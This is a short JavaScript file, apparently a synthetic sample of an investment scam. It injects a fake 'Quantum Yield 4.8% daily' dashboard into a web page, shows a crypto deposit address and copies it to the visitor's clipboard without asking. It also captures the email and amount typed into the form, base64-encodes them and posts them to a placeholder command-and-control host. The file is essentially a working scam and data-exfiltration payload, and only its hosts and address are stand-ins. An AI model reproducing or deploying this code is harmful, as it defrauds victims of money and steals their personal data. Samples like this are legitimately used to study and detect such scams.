// PONZIPAGE — synthetic investment-scam product sample.
(function () {
  var C2 = 'https://c2.example.test/invest';
  var DEPOSIT = '0x000000000000000000000000000000000000BEEF';
  console.log('[PONZIPAGE] dashboard injected');

  function render() {
    try {
      var dashboard = document.createElement('section');
      dashboard.id = 'ponzi-dashboard';
      dashboard.innerHTML =
        '<h1>Quantum Yield 4.8% daily</h1>' +
        '<p>Deposit address: <code>' + DEPOSIT + '</code></p>' +
        '<form><input name="email"><input name="amount"><button>Invest</button></form>';
      document.body.appendChild(dashboard);
      dashboard.addEventListener('submit', function (event) {
        if (event.preventDefault) event.preventDefault();
        var email = dashboard.querySelector('input[name="email"]');
        var amount = dashboard.querySelector('input[name="amount"]');
        report({
          email: email ? email.value : 'demo@example.test',
          amount: amount ? amount.value : '2500'
        });
      });
    } catch (error) {}
  }

  function report(data) {
    var packet = { ...data, deposit: DEPOSIT, origin: location.origin, ts: Date.now() };
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('ponzi:lead', JSON.stringify(packet)); } catch (error) {}
    console.log('[PONZIPAGE] lead captured', data.email);
  }

  render();
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(DEPOSIT);
  } catch (error) {}
  report({ email: 'demo@example.test', amount: '2500' });
  setTimeout(function () { console.log('[PONZIPAGE] support popup'); }, 800);
})();
